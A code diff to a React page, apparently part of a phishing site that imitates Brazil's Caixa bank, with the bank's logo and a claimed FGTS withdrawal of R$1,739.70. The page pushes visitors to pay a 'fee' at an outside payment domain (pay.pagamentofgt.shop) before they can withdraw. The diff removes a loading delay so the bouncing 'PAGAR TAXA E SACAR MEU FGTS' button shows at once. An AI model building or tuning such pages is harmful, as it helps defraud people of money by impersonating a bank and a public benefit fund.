@@ -7,14 +7,14 @@ import { Helmet } from "react-helmet";
 import { UserData } from "../types/userData";
 import cartao from "../assets/cartao.png"
 import logocaixa from "../assets/caixalogo.png"
-import { FaSpinner } from "react-icons/fa";
+
 
 
 export function PagamentoTarifa() {
     const [displayedAmount, setDisplayedAmount] = useState(0);
     const saqueTotal = 1739.70;
 
-    const [isVisible, setIsVisible] = useState(false);
+    const [, setIsVisible] = useState(false);
 
     useEffect(() => {
         const SECONDS_TO_DISPLAY = 44;
@@ -115,23 +115,14 @@ export function PagamentoTarifa() {
                 </div>
 
                 {/* Botão de confirmação */}
-                {
-                    isVisible ? (
-                        <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
-                            <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
-                                PAGAR TAXA E SACAR MEU FGTS
-                            </button>
-                        </a>
-                    ) :
-                        (
 
-                            <div className=" text-zinc-700 px-6 rounded-md  transition-all duration-200 w-full mt-3 opacity-40 flex text-2xl items-center justify-center space-x-2">
-                                <FaSpinner className="animate-spin" /> {/* Ícone de carregamento girando */}
-                                <span>Carregando...</span>
-                            </div>
+                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
+                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
+                        PAGAR TAXA E SACAR MEU FGTS
+                    </button>
+                </a>
 
-                        )
-                }
+
 
 
                 {/* Informações sobre o saque disponível */}
